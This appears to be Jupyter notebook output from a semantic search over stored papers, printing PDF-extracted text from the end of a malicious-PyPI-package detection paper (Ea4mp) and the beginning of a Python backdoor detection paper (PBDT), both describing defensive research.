positives.\\nItisimportanttonotethattrainingorfine-tuninglargelanguage\\nmodels requires significant time and computational resources. For\\nexample,inEa4mp,fine-tuningapre-trainedBERT-basemodeltook\\nnearly 3 hours on an NVIDIA Tesla V100 32GB GPU. Compared to\\nexisting work that only trains a machine learning or deep learning\\nmodel [52, 18, 24, 40], Pre-training or fine-tuning a large language\\nmodeltakesseveraltimesaslong.Fortunately,weonlyneedtopre-\\ntrain or fine-tune the large language model for once. Subsequent\\ncalls to the model take relatively little time.\\n6 RELATED WORK\\nOurworkhasconnectionswiththreedifferentresearchareas,which\\nwe survey briefly: malicious package detection, package registry\\nsecurity, and empirical study of package security.\\nMalicious Package Detection.Detecting various malicious soft-\\nware packages within open-source software registries poses a sig-\\nnificantchallenge.Duanetal.[17]andGuetal.[20]bothemployed\\na multi-dimensional analysis framework to address this challenge.\\nTheyanalyzeregistrysecuritybasedonfundamentalregistryinfor-\\nmation, function calls at the source code level, package execution,\\nand system calls during dynamic analysis. Through continuous\\nmonitoring of mainstream open-source libraries, they have uncov-\\nered many suspicious packages. Liang et al. [23] introduced PPD, a\\nthird-party malware library identification framework employing\\nanomaly detection. This framework imports required packages to\\nform a comprehensive code package, utilizes AST and RegExp to\\nextract code features (e.g., IP addresses, dangerous functions), and\\nincorporates Levenshtein distance of package names into the fea-\\nture set. Anomaly detection algorithms are then employed to iden-\\ntify malicious packages. During the development of open-source\\npackages, developers often host code on GitHub. Inconsistencies\\nbetween the code released on PyPI and its corresponding GitHub\\nrepositorymayindicatemaliciousinjection.Toaddressthisconcern,\\nVu et al. [44] proposed LastPyMile, a framework for identifying\\ndisparities between software package construction artefacts and\\ncorresponding source code repositories. LastPyMile facilitates the\\nmonitoringofregistrysecurity,suchasPyPI,tomitigatesuchrisks.\\nZhang et al. [50] proposed Cerebro, an approach for extracting\\ncode behavior sequences based on abstract syntax trees. By extract-\\ning available APIs in the abstract syntax tree, a code sequence that\\n1168\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. 1+1>2: Integrating Deep Code Behaviors with Metadata Features for Malicious PyPI Package Detection ASE ’24, October 27-November 1, 2024, Sacramento, CA, USA\\ncandescribethemaliciousbehaviorsofattackersisformed,andthe\\nsequenceisusedasinputforfine-tuningtheBERTmodel.Although\\nZhang’s approach considers that code behavior sequence can as-\\nsist the model in understanding the attacker’s attack mode, the\\nextraction of behavior sequence still does not break away from the\\nlimitation of manual feature recognition. Liang et al. [24] proposed\\nan approach called MPHunter to identify malicious packages by\\nextracting code behavior sequences, converting the sequences into\\nvectors, and using clustering to find outliers. However, Liang’s\\napproach can only detect the setup.py script in the package, and\\naccordingtoGuoetal.[21],itisnotdifficulttofindthatattackersof-\\nten implant malicious code in multiple scripts to confuse detection\\napproaches.\\nIn contrast, our approach analyzes all Python script files and\\nautomatically extracts deep features from ordered code behavior\\nsequences of malicious packages via the BERT model without hu-\\nman intervention. In addition, we realize the value of metadata\\ninformation and construct an ensemble classifier to combine the\\nstrengths of code behavior features and metadata features for more\\neffective detection.\\nPackage Registry Security.There are many repositories that are\\noftenexploitedasplatformsfordistributingmaliciouscodeandsoft-\\nware libraries. Anomalicious leverages commit logs and repository\\nmetadata to identify anomalies and potentially malicious commits\\nautomatically.AttackersfrequentlyutilizeGitHub’sforkfunctionas\\nameanstostoreanddistributemalware[19].Tocounterthisthreat,\\nZhangetal.[51]employedanenhanceddeepneuralnetwork(DNN)\\nto analyze the code content of GitHub repositories. They utilized a\\nheterogeneous information network (HIN) to model neighborhood\\nrelationships, thereby enhancing recognition accuracy. Malicious\\nactorsoftenembedharmfulshellcommandsintoPythonscriptsfor\\nillicitpurposes.Conventionalstaticanalysisapproachesstruggleto\\ndetectsuchattacks.Zhouetal.[52]introducedPyComm,amachine\\nlearning-based model for detecting malicious commands in Python\\nscripts. PyComm considers multidimensional features, simultane-\\nously evaluating 12 statistical features of Python source code and\\nstring sequences. Fang et al. [18] utilized machine learning tech-\\nniquestoidentifyPythonbackdoors.Theyrepresentedtextthrough\\nstatistical features arising from confusion and the characteristics\\nof opcode sequences during compilation. Suspicious modules and\\nfunctions within the code were then matched, effectively detecting\\nembedded backdoors.\\nEmpiricalStudyofPackageSecurity. Tohelpresearchersgaina\\nmore comprehensive and in-depth understanding of package secu-\\nrity,existingworkhastheoreticallyexaminedattackers’approaches\\nand the composition of malicious code. Neupane et al. [27] con-\\nducted an in-depth analysis of typosquatting attacks. They moved\\nbeyondthetraditionaluseof1-stepDLdistancetoidentifypackage\\nconfusion attacks and instead categorized these attacks into 13 dis-\\ntinct types. They proposed a heuristics approach for automatically\\nidentifying package confusion based on these categories. Guo et\\nal. [21] constructed a dataset of malicious code and classified the\\ncollected malicious code based on its behavioral characteristics.\\nThey analyzed the propagation pathways of malicious packages\\nandtheirdistributionacrossdifferentmirrorrepositories.Addition-\\nally, they mapped the lifecycle of malicious code within the PyPI\\necosystem, highlighting the characteristics of malicious packages\\nat various stages. To enhance the security of the PyPI ecosystem,\\nthey proposed several mitigation measures.\\n7 CONCLUSION AND FUTURE WORK\\nIn this paper, we propose Ea4mp, an ensemble approach that com-\\nbines a fine-tuned BERT model and a well-trained ML model to\\ndetect malicious PyPI packages. We comprehensively consider the\\ncode behavior sequence and metadata information for malicious\\npackage detection. The BERT model is fine-tuned with code behav-\\nior sequences that were extracted from source code, and feature\\nvectors extracted from metadata are used to train the machine\\nlearning model. We use the AdaBoost algorithm to ensemble these\\ntwo models so that they can accurately detect malicious packages.\\nWe evaluate Ea4mp against the state-of-the-art approaches on a\\nnewly-constructeddataset.Ea4mpperformsbetteronmostmetrics.\\nWe also applied Ea4mp to real-world detection and found a total of\\n119 malicious packages by detecting 46573 newly uploaded PyPI\\npackages, the vast majority of which have been removed by PyPI\\nofficials. This indicates that Ea4mp is a practical approach that can\\nbeadoptedbythePythoncommunitytodetectemergingmalicious\\npackages.\\nIn the future, we plan to extend this approach to other open-\\nsource libraries, such as npm and Maven, to further enhance the\\nsecurity of software ecosystems across different programming lan-\\nguages.\\nACKNOWLEDGMENTS\\nThis research is supported by the National Natural Science Foun-\\ndation of China (No. 62202414 and 62402342), the Six Talent Peaks\\nProject in Jiangsu Province (No. RJFW-053); the Jiangsu “333”\\nProject and Yangzhou University Top-level Talents Support Pro-\\ngram (2022), the Open Funds of State Key Laboratory for Novel\\nSoftwareTechnologyofNanjingUniversity(No.KFKT2022B17),the\\nOpen Foundation of Yunnan Key Laboratory of Software Engineer-\\ning (No. 2023SE201), Postgraduate Research & Practice Innovation\\nProgram of Jiangsu Province (KYCX24_3747), and the China Schol-\\narship Council Foundation (No. 202308320436).\\nREFERENCES\\n[1] Bertus.2020.Ossgadget:collectionoftoolsforanalyzingopensourcepackages.\\nhttps://github.com/microsoft/OSSGadget.\\n[2] Piotr Bojanowski, Edouard Grave, Armand Joulin, and Tomás Mikolov. 2017.\\nEnriching word vectors with subword information.Trans. Assoc. Comput. Lin-\\nguistics, 5, 135–146. doi: 10.1162/TACL\\\\_A\\\\_00051.\\n[3] Jie Cai, Bin Li, Jiale Zhang, and Xiaobing Sun. 2024. Ponzi scheme detection in\\nsmart contract via transaction semantic representation learning.IEEE Trans.\\nReliab., 73, 2, 1117–1131.\\n[4] Sicong Cao, Xiaobing Sun, Lili Bo, Ying Wei, and Bin Li. 2021.BGNN4VD:\\nconstructing bidirectional graph neural-network for vulnerability detection.\\nInf. Softw. Technol., 136, 106576.\\n[5] Sicong Cao, Xiaobing Sun, Lili Bo, Rongxin Wu, Bin Li, and Chuanqi Tao. 2022.\\nMVD: memory-related vulnerability detection based on flow-sensitive graph\\nneural networks. InProceedings of the 44th IEEE/ACM International Conference\\non Software Engineering (ICSE). ACM, 1456–1468.\\n[6] Sicong Cao, Xiaobing Sun, Xiaoxue Wu, David Lo, Lili Bo, Bin Li, and Wei Liu.\\n2024. Coca: improving and explaining graph neural network-based vulner-\\nability detection systems. InProceedings of the 46th IEEE/ACM International\\nConference on Software Engineering (ICSE). ACM, 155:1–155:13.\\n[7] Sicong Cao et al. 2023. Improving java deserialization gadget chain mining\\nvia overriding-guided object generation. InProceedings of the 45th IEEE/ACM\\nInternational Conference on Software Engineering (ICSE). IEEE, 397–409.\\n1169\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. ASE ’24, October 27-November 1, 2024, Sacramento, CA, USA Xiaobing Sun, Xingan Gao, Sicong Cao, Lili Bo, Xiaoxue Wu, and Kaifeng Huang\\n[8] SicongCaoetal.2023.Oddfuzz:discoveringjavadeserializationvulnerabilities\\nvia structure-aware directed greybox fuzzing. InProceedings of the 44th IEEE\\nSymposium on Security and Privacy (SP). IEEE, 2726–2743.\\n[9] coetaur0.2022.Python3controlflowgraphgenerator.RetrievedAugust8,2022\\nfrom https://github.com/coetaur0/staticfg.\\n[10] Alibaba company. 2024. Pypi mirror of alibaba company. Retrieved May 20,\\n2024 from https://mirrors.aliyun.com/pypi/simple/.\\n[11] Huawei company. 2024. Pypi mirror of huawei company. Retrieved May 20,\\n2024 from https://mirrors.huaweicloud.com/repository/pypi/simple/.\\n[12] Snykio company. 2024. Open source vulnerability database. Retrieved May 20,\\n2024 from https://security.snyk.io/.\\n[13] Tencent company. 2024. Pypi mirror of tencent company. Retrieved May 20,\\n2024 from https://mirrors.cloud.tencent.com/pypi/simple.\\n[14] VirusTOTAL company. 2024. Analyse suspicious files, domains, ips and urls to\\ndetectmalwareandotherbreaches,automaticallysharethemwiththesecurity\\ncommunity. Retrieved May 20, 2024 from https://www.virustotal.com/gui/ho\\nme/upload.\\n[15] Jacob Devlin, Ming-Wei Chang, Kenton Lee, and Kristina Toutanova. 2019.\\nBERT:pre-trainingofdeepbidirectionaltransformersforlanguageunderstand-\\ning. InProceedings of the 2019 Conference of the North American Chapter of\\nthe Association for Computational Linguistics: Human Language Technologies,\\nNAACL-HLT 2019, Minneapolis, MN, USA, June 2-7, 2019, Volume 1 (Long and\\nShort Papers). Jill Burstein, Christy Doran, and Thamar Solorio, (Eds.) Associa-\\ntion for Computational Linguistics, 4171–4186. doi: 10.18653/V1/N19-1423.\\n[16] douban. 2024. Pypi mirror of douban company. Retrieved May 20, 2024 from\\nhttp://pypi.doubanio.com/simple/.\\n[17] Ruian Duan, Omar Alrawi, Ranjita Pai Kasturi, Ryan Elder, Brendan Saltafor-\\nmaggio, and Wenke Lee. 2021. Towards measuring supply chain attacks on\\npackage managers for interpreted languages. In28th Annual Network and Dis-\\ntributed System Security Symposium, NDSS 2021, virtually, February 21-25, 2021.\\nThe Internet Society. https://www.ndss-symposium.org/ndss-paper/towards-\\nmeasuring-supply-chain-attacks-on-package-managers-for-interpreted-lan\\nguages/.\\n[18] Yong Fang, Mingyu Xie, and Cheng Huang. 2021. PBDT: python backdoor\\ndetection model based on combined features.Secur. Commun. Networks, 2021,\\n9923234:1–9923234:13. doi: 10.1155/2021/9923234.\\n[19] Danielle Gonzalez, Thomas Zimmermann, Patrice Godefroid, and Max Schae-\\nfer. 2021. Anomalicious: automated detection of anomalous and potentially\\nmalicious commits on github. In43rd IEEE/ACM International Conference on\\nSoftwareEngineering:SoftwareEngineeringinPractice,ICSE(SEIP)2021,Madrid,\\nSpain,May25-28,2021 .IEEE,258–267.doi:10.1109/ICSE-SEIP52600.2021.00035.\\n[20] Yacong Gu, Lingyun Ying, Yingyuan Pu, Xiao Hu, Huajun Chai, Ruimin Wang,\\nXingGao,andHaixinDuan.2023.Investigatingpackagerelatedsecuritythreats\\nin software registries. In44th IEEE Symposium on Security and Privacy, SP 2023,\\nSan Francisco, CA, USA, May 21-25, 2023. IEEE, 1578–1595. doi: 10.1109/SP4621\\n5.2023.10179332.\\n[21] Wenbo Guo, Zhengzi Xu, Chengwei Liu, Cheng Huang, Yong Fang, and Yang\\nLiu. 2023. An empirical study of malicious code in pypi ecosystem.CoRR,\\nabs/2309.11021. arXiv: 2309.11021. doi: 10.48550/ARXIV.2309.11021.\\n[22] Gao K, He H, Xie B, and Zhou MH. 2024. Survey on open source software\\nsupply chains.Journal of Software (in Chinese), 35, 581–603. doi: 10.13328/j.cn\\nki.jos.006975.\\n[23] Genpei Liang, Xiangyu Zhou, Qingyu Wang, Yutong Du, and Cheng Huang.\\n2021. Malicious packages lurking in user-friendly python package index. In\\n20th IEEE International Conference on Trust, Security and Privacy in Computing\\nand Communications, TrustCom 2021, Shenyang, China, October 20-22, 2021.\\nIEEE, 606–613. doi: 10.1109/TRUSTCOM53373.2021.00091.\\n[24] Wentao Liang, Xiang Ling, Jingzheng Wu, Tianyue Luo, and Yanjun Wu. 2023.\\nAneedleisanoutlierinahaystack:huntingmaliciouspypipackageswithcode\\nclustering. In38th IEEE/ACM International Conference on Automated Software\\nEngineering, ASE 2023, Luxembourg, September 11-15, 2023. IEEE, 307–318. doi:\\n10.1109/ASE56229.2023.00085.\\n[25] lwn. 2024. A backdoor in xz. Retrieved May 20, 2024 from https://lwn.net/Arti\\ncles/967194/.\\n[26] 2024. Maven index. https://maven.apache.org/.\\n[27]ShradhaNeupane,GrantHolmes,ElizabethWyss,DrewDavidson,andLorenzo\\nDe Carli. 2023. Beyond typosquatting: an in-depth look at package confusion.\\nIn32nd USENIX Security Symposium, USENIX Security 2023, Anaheim, CA, USA,\\nAugust 9-11, 2023. Joseph A. Calandrino and Carmela Troncoso, (Eds.) USENIX\\nAssociation, 3439–3456. https://www.usenix.org/conference/usenixsecurity23\\n/presentation/neupane.\\n[28] 2024. New malicious pypi packages caught using covert side-loading tactics.\\nhttps://thehackernews.com/2024/02/new-malicious-pypi-packages-caught.h\\ntml.\\n[29] 2024. Npm index. https://www.npmjs.com/.\\n[30] 2024. Nuget index. https://www.nuget.org/.\\n[31]Marc Ohm, Henrik Plate, Arnold Sykosch, and Michael Meier. 2020. Backstab-\\nber’s knife collection: A review of open source software supply chain attacks.\\nIn Detection of Intrusions and Malware, and Vulnerability Assessment - 17th\\nInternational Conference, DIMVA 2020, Lisbon, Portugal, June 24-26, 2020, Pro-\\nceedings(LectureNotesinComputerScience).ClémentineMaurice,LeylaBilge,\\nGianluca Stringhini, and Nuno Neves, (Eds.) Vol. 12223. Springer, 23–43. doi:\\n10.1007/978-3-030-52683-2\\\\_2.\\n[32] Adam Paszke et al. 2019. Pytorch: an imperative style, high-performance deep\\nlearning library. InProceedings of the 33rd Annual Conference on Neural Infor-\\nmation Processing Systems (NeurIPS), 8024–8035.\\n[33] 2024. Pypi index. https://pypi.org/.\\n[34] 2024. Pypi simple. https://pypi.org/simple/.\\n[35]Qi‘anxin. 2021. 2021 china software supply chain security analysis report.\\nRetrieved June 2, 2021 from https://www.qianxin.com/threat/reportdetail?rep\\nort_id=132.\\n[36] Qi‘anxin. 2022. 2022china software supply chain security analysis report. Re-\\ntrieved July 26, 2022 from https://www.qianxin.com/threat/reportdetail?report\\n_id=161.\\n[37] Qi‘anxin. 2023. 2023 china software supply chain security analysis report.\\nRetrieved July 24, 2023 from https://www.qianxin.com/threat/reportdetail?rep\\nort%5C_id=297.\\n[38] Qi‘anxin. 2024. Pypi massive forged packet name attack. Retrieved March 29,\\n2024 from https://mp.weixin.qq.com/s/VIThE0I5BkQBW6hIOubnkQ.\\n[39] Vitalis Salis, Thodoris Sotiropoulos, Panos Louridas, Diomidis Spinellis, and\\nDimitris Mitropoulos. 2021. Pycg: practical call graph generation in python.\\nIn 43rd IEEE/ACM International Conference on Software Engineering, ICSE 2021,\\nMadrid, Spain, 22-30 May 2021. IEEE, 1646–1657. doi: 10.1109/ICSE43902.2021\\n.00146.\\n[40] Adriana Sejfia and Max Schäfer. 2022. Practical automated detection of mali-\\nciousnpmpackages.In 44thIEEE/ACM44thInternationalConferenceonSoftware\\nEngineering, ICSE 2022, Pittsburgh, PA, USA, May 25-27, 2022. ACM, 1681–1692.\\ndoi: 10.1145/3510003.3510104.\\n[41] 2024. Tiobe index. https://www.tiobe.com/tiobe-index/.\\n[42] Tsinghua university. 2024. Pypi mirror of tsinghua university. Retrieved May\\n20, 2024 from https://pypi.tuna.tsinghua.edu.cn/simple/.\\n[43] D.-L. Vu. 2020. A fork of bandit tool with patterns to identifying malicious\\npython code. https://github.com/lyvd/bandit4mal.\\n[44] Duc Ly Vu, Fabio Massacci, Ivan Pashchenko, Henrik Plate, and Antonino Sa-\\nbetta. 2021. Lastpymile: identifying the discrepancy between sources and pack-\\nages.InESEC/FSE’21:29thACMJointEuropeanSoftwareEngineeringConference\\nand Symposium on the Foundations of Software Engineering, Athens, Greece, Au-\\ngust 23-28, 2021. Diomidis Spinellis, Georgios Gousios, Marsha Chechik, and\\nMassimiliano Di Penta, (Eds.) ACM, 780–792. doi: 10.1145/3468264.3468592.\\n[45] Thomas Wolf et al. 2019. Huggingface’s transformers: state-of-the-art natural\\nlanguage processing.arXiv preprint arXiv: 1910.03771.\\n[46] Elizabeth Wyss, Alexander Wittman, Drew Davidson, and Lorenzo De Carli.\\n2022. Wolf at the door: preventing install-time attacks in npm with latch. In\\nASIACCS’22:ACMAsiaConferenceonComputerandCommunicationsSecurity,\\nNagasaki, Japan, 30 May 2022 - 3 June 2022. Yuji Suga, Kouichi Sakurai, Xuhua\\nDing, and Kazue Sako, (Eds.) ACM, 1139–1153. doi: 10.1145/3488932.3523262.\\n[47] Jiale Zhang, Chengcheng Zhu, Chunpeng Ge, Chuan Ma, Yanchao Zhao, Xi-\\naobing Sun, and Bing Chen. 2024. Badcleaner: defending backdoor attacks in\\nfederated learning via attention-based multi-teacher distillation.IEEE Trans.\\nDependable Secur. Comput., 21, 5, 4559–4573.\\n[48] Jiale Zhang, Chengcheng Zhu, Xiaobing Sun, Chunpeng Ge, Bing Chen, Willy\\nSusilo,andShuiYu.2024.Flpurifier:backdoordefenseinfederatedlearningvia\\ndecoupled contrastive training.IEEE Trans. Inf. Forensics Secur., 19, 4752–4766.\\n[49] Jiale Zhang, Chengcheng Zhu, Di Wu, Xiaobing Sun, Jianming Yong, and\\nGuodong Long. 2021. Badfss: backdoor attacks on federated self-supervised\\nlearning. InProceedings of the 33rd International Joint Conference on Artificial\\nIntelligence (IJCAI).\\n[50] Junan Zhang, Kaifeng Huang, Bihuan Chen, Chong Wang, Zhenhao Tian, and\\nXin Peng. 2023. Malicious package detection in NPM and pypi using a single\\nmodelofmaliciousbehaviorsequence. CoRR,abs/2309.02637.arXiv:2309.02637.\\ndoi: 10.48550/ARXIV.2309.02637.\\n[51] YimingZhang,YujieFan, ShifuHou,YanfangYe,XushengXiao,PanLi, Chuan\\nShi,LiangZhao,andShouhuaiXu.2020.Cyber-guideddeepneuralnetworkfor\\nmalicious repository detection in github. In2020 IEEE International Conference\\non Knowledge Graph, ICKG 2020, Online, August 9-11, 2020. Enhong Chen and\\nGrigoris Antoniou, (Eds.) IEEE, 458–465. doi: 10.1109/ICBK50248.2020.00071.\\n[52] Anmin Zhou, Tianyi Huang, Cheng Huang, Dunhan Li, and Chuangchuang\\nSong. 2022. Pycomm: malicious commands detection model for python scripts.\\nJ. Intell. Fuzzy Syst., 42, 3, 2261–2273. doi: 10.3233/JIFS-211557.\\n1170\\nAuthorized licensed use limited to: Oracle. Downloaded on March 25,2025 at 09:18:28 UTC from IEEE Xplore.  Restrictions apply. '} score: 0.06033829771023746\n"
     ]
    }
   ],
   "source": [
    "hits = client.query_points(\n",
    "    collection_name=\"my_papers\",\n",
    "    query=encoder.encode(\"Levenshtein distance\").tolist(),\n",
    "    limit=3,\n",
    ").points"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "df1d244a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{\n",
      "  \"metadata\": {\n",
      "    \"/Creator\": \"Aspose Pty Ltd.\",\n",
      "    \"/ModDate\": \"D:20250325022231-07'00'\",\n",
      "    \"/CreationDate\": \"D:20210913202330+05'30'\",\n",
      "    \"/Producer\": \"Aspose.PDF for .NET 23.2.0; modified using iText 4.2.0 by 1T3XT\",\n",
      "    \"/Subject\": \"Security and Communication Networks 2021.2021:9923234\",\n",
      "    \"/WPS-PROCLEVEL\": \"3\",\n",
      "    \"/WPS-JOURNALDOI\": \"10.1155/2037\",\n",
      "    \"/Title\": \"PBDT: Python Backdoor Detection Model Based on Combined Features\",\n",
      "    \"/WPS-ARTICLEDOI\": \"10.1155/2021/9923234\"\n",
      "  },\n",
      "  \"data\": \"Research Article\\nPBDT: Python Backdoor Detection Model Based on\\nCombined Features\\nYong Fang, Mingyu Xie, and Cheng Huang\\nSchool of Cyber Science and Engineering, Sichuan University, Chengdu, China\\nCorrespondence should be addressed to Cheng Huang; opcodesec@gmail.com\\nReceived 1 April 2021; Accepted 31 August 2021; Published 14 September 2021\\nAcademic\\nEditor: Shah Nazir\\nCopyright \\u00a9 2021 Yong Fang et al. 'is is an open access article distributed under the Creative Commons Attribution License,\\nwhich permits unrestricted use, distribution, and reproduction in any medium, provided the original work is properly cited.\\nApplication security is essential in today\\u2019s highly development period. Backdoor is a means by which attackers can invade the\\nsystem to achieve illegal purposes and damage users\\u2019 rights. It has posed a serious threat to network security. 'us, it is urgent to\\ntakeadequatemeasurestodefendsuchattacks.PreviousresearchworkwasmainlyfocusedonnumerousPHPwebshells,withless\\nresearch on Python backdoor \\ufb01les. Language di\\ufb00erences make the method not entirely applicable. 'is paper proposes a Python\\nbackdoor detection model named PBDT based on combined features. 'e model summarizes the common functional modules\\nandfunctionsinthebackdoor\\ufb01lesandextractsthenumberofcallsinthetexttoformsamplefeatures.Whatismore,weconsider\\nthe text\\u2019s statistical characteristics, including the information entropy, the longest string, etc., to identify the obfuscated Python\\ncode. Besides, the opcode sequence is used to represent code characteristics, such as TF-IDF vector and FastText classi\\ufb01er, to\\neliminate the in\\ufb02uence of interference items. Finally, we introduce the Random Forest algorithm to build a classi\\ufb01er. Covering\\nmosttypesofbackdoors,somesamplesareobfuscated,themodelachievesanaccuracyof97.70%,andtheTNRindexisashighas\\n98.66%, showing a good classi\\ufb01cation performance in Python backdoor detection.\\n1. Introduction\\nWiththerapiddevelopmentofnetworktechnologyinrecent\\nyears, various applications have become the primary way to\\nprovide information services, signi\\ufb01cantly improving the\\nconvenienceofpeople\\u2019s life. However,oncecriminalsutilize\\nit, it will cause data leakage and property damage. Among\\nthem, the backdoor is an e\\ufb00ective means for attackers to\\nachieve the purpose of intrusion. 'e 2020 State of Malware\\nReport [1] released by Malwarebytes Labs shows that\\nbackdoors have continuously become the top ten common\\nsecurity threat\\u2019s categories among users and commercial\\nproducts, and the proportion is increasing. Su\\ufb03cient\\nidenti\\ufb01cation of backdoors to take further measures has\\nbecome the current research\\u2019s focus in cyber security.\\nAs a concise, easy-to-read, and extensible programming\\nlanguage, Python has beenwidely used in large-scale project\\ndevelopment while initially only writing automated scripts.\\nNevertheless, there is little research on malicious Python\\ncode. Most of the existing backdoor-related research is\\naimed at PHP or general-purpose webshells [2\\u20138] and has\\nnotconsideredotherbackdoortypes.Simultaneously,dueto\\nthedi\\ufb00erencesinprogramminglanguages,existingmethods\\nare not fully applicable to Python text. 'ere are feature\\nselections for programming language functions or pro-\\ngramming features in the research methods, such as PHP\\nlanguage tags \\u201c<?php. . .?>\\u201d, \\u201cshell_exec ()\\u201d functions, etc.\\n'ese features should have corresponding changes to the\\nPython language. At the same time, the previous research\\ndid not involve a more detailed analysis and summary of\\nfunction behavior of the backdoor. We think that these are\\nessential when judging the maliciousness.\\n'e attacker will use the backdoor to perform a series of\\nsubsequent operations, which must leave traces on the\\nvictim\\u2019s host. Some studies [9, 10] use the dynamic acqui-\\nsition of logs and other information to capture backdoor\\nbehaviors for detection. However, some can use system\\nprocesses to hide their existence, such as thread insertion\\nbackdoor (Section 2.1), and this method does not identify\\nwell. As deep learning is widely used in the security \\ufb01eld,\\nsome papers [11\\u201314] use deep neural networks to check\\nwebshells and achieve good results. Nevertheless, Python\\nHindawi\\nSecurity and Communication Networks\\nVolume 2021, Article ID 9923234, 13 pages\\nhttps://doi.org/10.1155/2021/9923234\\nbackdoordatasetissparse,sotrainingadeepneuralnetwork\\nmay cause over\\ufb01tting and consume numerous system re-\\nsources, resulting in poor overall performance. Moreover,\\nthe full-text feature extraction ignores the functions and\\nmodules that implement the backdoor\\u2019s basic functions.\\nDetailed research on malicious python code behavior has\\nbecome a research point that needs to be broken.\\n'is paper uses machine learning method for Python\\nbackdoor detection by combining multiple features such as\\nfunction calls, text statistics, and opcodes. First, we analyze\\nthe modules and functions required for the basic functions\\nof Python backdoor, includingtext encryption, network\\ncommunication, process settings, \\ufb01le operations, command\\nexecution,and system control.'en,wecountthe numberof\\ntimes the suspicious module or function appears in the text\\nandrecordthesuspiciousfunction\\u2019scodeline.Whatismore,\\nthe entire text\\u2019s statistical characteristics, includinginfor-\\nmation entropy, longest string, coincidence index, andcom-\\npression rate, are obtained to capture the characteristics of\\nobfuscated codes. We also consider the number of IP, URL,\\nandmanydangerouskeywordsthat frequentlyappearin the\\nbackdoor. In addition, using the opcode information, the\\ncode is represented by the statistical features of the overall\\ntext and suspicious function lines, the TF-IDF feature\\nrepresenting the contextual relevance, and the FastText\\nfeature. Finally, it is sent to the Random Forest classi\\ufb01er to\\ndetermine whether it belongs to the backdoor. 'e main\\ncontributions of this paper are as follows:\\n(1) Inresponsetolackofdataset,wemanuallygenerated\\nsome Python backdoor samples, including rebound\\nshell and obfuscated code, to expand the sample\\nlibrary and improve the accuracy of classi\\ufb01er\\ndetection.\\n(2) By analyzing many real samples, the malicious\\nfunctionsandmodulesfrequentlyusedinthePython\\nbackdoor are summarized to distinguish the benign\\nandmalicioussample.Weintegratemultipletypesof\\nfeatures to classify malicious codes. Both statistical\\nfeatures and opcode features can eliminate the in-\\n\\ufb02uence of obfuscated codes and ignore irrelevant\\ninformation such as text comments. Simultaneously,\\nthen-gramvalueselectionfullyconsidersthePython\\nopcode\\u2019s characteristics and accurately represents\\nthe text information.\\n(3) We collect a total of 2,026 samples to test the pro-\\nposed model, including 1,511 benign Python codes\\nand 515 Python backdoor codes. In the end, all\\nindicators of PBDT reach more than 95%, and the\\naccuracy is as high as 97.7%.\\nTo verify the validity of PBDT, a series of comparative\\nexperiments are designed. 'e results show that, compared\\nwith other machine learning algorithms, Random Forest\\nhas better performance in the classi\\ufb01cation of Python\\nbackdoors,and the performanceof thecombinedfeature is\\nbetter than any single feature, which also has a more re-\\nmarkable performance improvement than the previous\\npaper method.\\n'e rest of this paper is organized as follows. Section 2\\nintroducestherelevantbackground,includingthede\\ufb01nition\\nand classi\\ufb01cation of backdoors and previous research work.\\nWe will describe the PBDTsystem architecture and speci\\ufb01c\\nimplementation methods in Section 3. Subsequently, in\\nSection 4, the dataset and the evaluation results of PBDTare\\nexplained and analyzed. Finally, Section 5 summarizes the\\nfull study.\\n2. Background\\n2.1. Backdoor. 'omas and Francillon [15] de\\ufb01nition of the\\nbackdoor is that the intentional structure existing in the\\nsystem undermines the original security of the system by\\nproviding convenient access to other privileged functions or\\ninformation. In other words, the backdoor refers to a\\nprogram method that bypasses security controls such as\\nauthentication to obtain system permissions, whose com-\\nmon types include webshell, C/S backdoor, thread insertion\\nbackdoor, and extended backdoor:\\n(1) Webshell refers to the backdoor program that exists\\ninthewebapplication.'e\\ufb01leformatincludesPHP,\\nASP, JSP, Python, and so on. After the attacker\\nexploits the vulnerability to invade the website, the\\nwebshell is placed in the server \\ufb01le directory for\\nsubsequent remote control, execution of malicious\\ncommands, and other operations.\\n(2) C/S backdoor uses a client/server model to achieve\\nthe control operation, some of which are similar to\\ntraditional Trojan programs\\u2019 principles. After the\\nattackerimplantstheserverintothetargetcomputer,\\nthe client starts the backdoor to control it. Rebound\\nshellisalsobased onthismode,but thetworolesare\\nprecisely the opposite. 'e attacker runs a server\\nprogram to monitor a speci\\ufb01c TCP/UDP port, and\\nthe victim host initiates a request for an active\\nconnection. 'is rebound connection is usually\\napplicable to scenarios such as restricted \\ufb01rewalls,\\noccupied ports, and insu\\ufb03cient permissions on the\\ncontrolled end.\\n(3) 'read insertion backdoor does not have an inde-\\npendent process when it runs but inserts into a\\nparticular service or thread of the system, which is\\nnow a mainstream type of backdoor. However, it is\\nrelatively di\\ufb03cult to detect or kill, and traditional\\n\\ufb01rewalls cannot e\\ufb00ectively defend against it.\\n(4) 'e extended backdoor usually concentrates a va-\\nriety of common functions, including system user\\ndetection, port opening, opening/stopping services,\\nHTTP access, and \\ufb01le upload/download. It has\\npowerful functions but relatively inadequate\\nconcealment.\\nPython has simple structures but powerful functions.\\nAttackers only need to write scripts\\u2019 dozens of lines to es-\\ntablish a persistent backdoor. And because Python is a\\ncommon language used by administrators, there is no no-\\nticeable di\\ufb00erence between malicious Python tra\\ufb03c and the\\n2 Security and Communication Networks\\n 2037, 2021, 1, Downloaded from https://onlinelibrary.wiley.com/doi/10.1155/2021/9923234 by Morocco Hinari NPL, Wiley Online Library on [25/03/2025]. See the Terms and Conditions (https://onlinelibrary.wiley.com/terms-and-conditions) on Wiley Online Library for rules of use; OA articles are governed by the applicable Creative Commons License\\ntra\\ufb03c generated by daily network management tools, so it is\\ndi\\ufb03cult to be detected by the terminal detection response\\nsystem, and it is quite popular with hackers. As a result, the\\ntraditional backdoor recognition method is not universal,\\nand it is particularly important to realize an e\\ufb00ective de-\\ntection of Python backdoor scripts.\\n2.2. Related Work. At present, there is little research on\\nPython malicious code in security \\ufb01eld. 'e papers on\\nbackdoor detection mainly focus on webshell. At the same\\ntime, JavaScript is also used as an interpretable language,\\nand part of the detection methods of malicious statements\\ncan be used in other language types. 'is section will in-\\ntroduce existing research on webshell and malicious\\nJavaScript from the perspective of static detection and\\ndynamic detection. Among them, 